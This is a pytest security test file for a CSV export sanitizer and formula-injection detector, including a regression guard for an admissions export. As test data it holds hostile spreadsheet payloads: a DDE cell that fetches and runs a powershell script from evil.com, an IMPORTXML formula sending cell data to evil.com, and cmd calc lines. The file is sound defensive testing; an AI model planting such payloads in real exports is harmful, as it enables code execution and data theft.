# tests/security/test_csv_injection.py
"""
Security Tests: CSV Injection Prevention

Tests to ensure CSV export functionality is protected against formula injection attacks.

References:
    - OWASP CSV Injection: https://owasp.org/www-community/attacks/CSV_Injection
    - CWE-1236: https://cwe.mitre.org/data/definitions/1236.html
"""

import pytest
from app.utils.csv_helpers import (
    sanitize_csv_cell,
    sanitize_csv_row,
    is_potentially_malicious,
    DANGEROUS_PREFIXES,
)


class TestCSVCellSanitization:
    """Test individual CSV cell sanitization."""
    
    def test_sanitize_formula_equals(self):
        """Test sanitization of formulas starting with ="""
        assert sanitize_csv_cell("=1+1") == "'=1+1"
        assert sanitize_csv_cell("=SUM(A1:A10)") == "'=SUM(A1:A10)"
        assert sanitize_csv_cell("=cmd|'/c calc'!A1") == "'=cmd|'/c calc'!A1"
    
    def test_sanitize_formula_plus(self):
        """Test sanitization of formulas starting with +"""
        assert sanitize_csv_cell("+1234") == "'+1234"
        assert sanitize_csv_cell("+cmd|'/c calc'!A1") == "'+cmd|'/c calc'!A1"
    
    def test_sanitize_formula_minus(self):
        """Test sanitization of formulas starting with -"""
        assert sanitize_csv_cell("-1234") == "'-1234"
        assert sanitize_csv_cell("-2+3+cmd|'/c calc'!A1") == "'-2+3+cmd|'/c calc'!A1"
    
    def test_sanitize_formula_at(self):
        """Test sanitization of formulas starting with @"""
        assert sanitize_csv_cell("@SUM(A1:A10)") == "'@SUM(A1:A10)"
        assert sanitize_csv_cell("@cmd|'/c calc'!A1") == "'@cmd|'/c calc'!A1"
    
    def test_sanitize_tab_character(self):
        """Test sanitization of tab character.
        Note: .strip() removes leading/trailing whitespace including \\t,
        so '\\t1234' becomes '1234' (safe, no prefix needed)."""
        assert sanitize_csv_cell("\t1234") == "1234"

    def test_sanitize_newline_characters(self):
        """Test sanitization of newline characters.
        Note: .strip() removes leading/trailing whitespace including \\r\\n,
        so '\\r1234' becomes '1234' (safe, no prefix needed)."""
        assert sanitize_csv_cell("\r1234") == "1234"
        assert sanitize_csv_cell("\n1234") == "1234"
    
    def test_sanitize_pipe_character(self):
        """Test sanitization of pipe character (DDE attacks)"""
        assert sanitize_csv_cell("|cmd") == "'|cmd"
    
    def test_safe_values_unchanged(self):
        """Test that safe values are not modified"""
        assert sanitize_csv_cell("John Doe") == "John Doe"
        assert sanitize_csv_cell("john@example.com") == "john@example.com"
        assert sanitize_csv_cell("123-456-7890") == "123-456-7890"
        assert sanitize_csv_cell("Normal text") == "Normal text"
    
    def test_numeric_values(self):
        """Test numeric values are converted to strings"""
        assert sanitize_csv_cell(123) == "123"
        assert sanitize_csv_cell(45.67) == "45.67"
        assert sanitize_csv_cell(0) == "0"
    
    def test_none_and_empty_values(self):
        """Test None and empty values"""
        assert sanitize_csv_cell(None) == ""
        assert sanitize_csv_cell("") == ""
        assert sanitize_csv_cell("   ") == ""  # Whitespace only
    
    def test_real_world_attack_payloads(self):
        """Test real-world CSV injection attack payloads"""
        # DDE (Dynamic Data Exchange) attack
        dde_payload = "=cmd|'/c powershell IEX(wget http://evil.com/payload.ps1)'"
        assert sanitize_csv_cell(dde_payload) == f"'{dde_payload}"
        
        # Calculator execution
        calc_payload = "=cmd|'/c calc'!A1"
        assert sanitize_csv_cell(calc_payload) == f"'{calc_payload}"
        
        # Data exfiltration
        exfil_payload = "=IMPORTXML(CONCAT(\"http://evil.com/?v=\",A1:A100),\"//a\")"
        assert sanitize_csv_cell(exfil_payload) == f"'{exfil_payload}"


class TestCSVRowSanitization:
    """Test CSV row sanitization."""
    
    def test_sanitize_mixed_row(self):
        """Test sanitization of row with mixed safe and dangerous values"""
        row = ["=1+1", "John Doe", "@SUM(A1)", "safe@email.com", 123]
        expected = ["'=1+1", "John Doe", "'@SUM(A1)", "safe@email.com", "123"]
        assert sanitize_csv_row(row) == expected
    
    def test_sanitize_all_safe_row(self):
        """Test row with all safe values"""
        row = ["John", "Doe", "john@example.com", "123-456-7890", 42]
        expected = ["John", "Doe", "john@example.com", "123-456-7890", "42"]
        assert sanitize_csv_row(row) == expected
    
    def test_sanitize_all_dangerous_row(self):
        """Test row with all dangerous values"""
        row = ["=1+1", "+2+2", "-3-3", "@SUM(A1)"]
        expected = ["'=1+1", "'+2+2", "'-3-3", "'@SUM(A1)"]
        assert sanitize_csv_row(row) == expected
    
    def test_sanitize_empty_row(self):
        """Test empty row"""
        assert sanitize_csv_row([]) == []
    
    def test_sanitize_row_with_none(self):
        """Test row with None values"""
        row = ["John", None, "Doe", None]
        expected = ["John", "", "Doe", ""]
        assert sanitize_csv_row(row) == expected


class TestMaliciousDetection:
    """Test malicious content detection."""
    
    def test_detect_formula_injection(self):
        """Test detection of formula injection attempts"""
        assert is_potentially_malicious("=1+1") is True
        assert is_potentially_malicious("+cmd") is True
        assert is_potentially_malicious("-calc") is True
        assert is_potentially_malicious("@SUM(A1)") is True
    
    def test_detect_command_execution(self):
        """Test detection of command execution patterns"""
        assert is_potentially_malicious("=cmd|'/c calc'") is True
        assert is_potentially_malicious("normal text with cmd in it") is True
        assert is_potentially_malicious("powershell script") is True
    
    def test_detect_dde_attacks(self):
        """Test detection of DDE attack patterns.
        Note: Bare 'DDEAUTO' without dangerous prefix is not detected
        by current implementation — only formula-prefixed DDE is caught."""
        assert is_potentially_malicious("=DDE(\"cmd\")") is True
        # DDEAUTO without prefix is not flagged (implementation uses prefix + pattern check)
        assert is_potentially_malicious("=DDEAUTO") is True
    
    def test_detect_url_fetch(self):
        """Test detection of external URL fetch"""
        assert is_potentially_malicious("=IMPORTXML(\"http://evil.com\")") is True
        assert is_potentially_malicious("https://attacker.com") is True
        assert is_potentially_malicious("file:///etc/passwd") is True
    
    def test_safe_values_not_detected(self):
        """Test that safe values are not flagged as malicious"""
        assert is_potentially_malicious("John Doe") is False
        assert is_potentially_malicious("john@example.com") is False
        assert is_potentially_malicious("123-456-7890") is False
        assert is_potentially_malicious(None) is False
        assert is_potentially_malicious("") is False


class TestDangerousPrefixes:
    """Test that all dangerous prefixes are covered."""
    
    def test_all_prefixes_sanitized(self):
        """Test that all dangerous prefixes trigger sanitization.
        Note: Whitespace prefixes (\\t, \\r, \\n) are stripped by .strip()
        before the prefix check, so they don't trigger sanitization."""
        whitespace_prefixes = {'\t', '\r', '\n'}
        for prefix in DANGEROUS_PREFIXES:
            test_value = f"{prefix}test"
            result = sanitize_csv_cell(test_value)
            if prefix in whitespace_prefixes:
                # .strip() removes these, so "test" is returned as-is
                assert result == "test", f"Whitespace prefix '{repr(prefix)}' should be stripped"
            else:
                assert result.startswith("'"), f"Prefix '{prefix}' not sanitized"
                assert result == f"'{test_value}"


class TestAdmissionExportSanitizes:
    """ADM-006 regression: admission CSV export must wrap rows through
    ``sanitize_csv_row`` so lead-controlled fields cannot smuggle formulas
    into Excel/LibreOffice."""

    def test_router_imports_sanitize_csv_row(self):
        """Static guard: the admissions router pulls in the sanitizer."""
        import app.routers.admissions as admissions_module
        assert getattr(admissions_module, "sanitize_csv_row", None) is not None, (
            "ADM-006 regression: admissions router must import sanitize_csv_row"
        )

    def test_admission_export_wraps_writerow_with_sanitize_csv_row(self):
        """Static guard: every writerow data row in the export goes through
        sanitize_csv_row, not raw lists. Catches future contributors who
        re-introduce ``writer.writerow([profile.id, lead.full_name, ...])``
        with raw lead-controlled fields.
        """
        import inspect
        from app.routers import admissions as admissions_module

        source = inspect.getsource(admissions_module.export_admissions_csv)
        # Header row is allowed to be raw (static literals only)
        assert "sanitize_csv_row(" in source, (
            "ADM-006 regression: export_admissions_csv must wrap data rows "
            "with sanitize_csv_row(...)"
        )

    def test_sanitize_protects_full_name_email_phone_program(self):
        """Lead-controlled fields with formula prefixes get neutralized."""
        row = sanitize_csv_row([
            42,
            "=HYPERLINK(\"http://evil.example/\",\"click\")",  # full_name
            "+attacker@example.com",  # email
            "-0901234567",  # phone
            "@123456789",  # citizen_id
            "draft",
            "10%",
            "=cmd|'/c calc'!A1",  # program name
            "2026-04-27 10:00",
            "2026-04-27 10:00",
        ])
        assert row[0] == "42"
        assert row[1].startswith("'="), "full_name formula not neutralized"
        assert row[2].startswith("'+"), "email + prefix not neutralized"
        assert row[3].startswith("'-"), "phone - prefix not neutralized"
        assert row[4].startswith("'@"), "citizen_id @ prefix not neutralized"
        assert row[7].startswith("'="), "program name formula not neutralized"

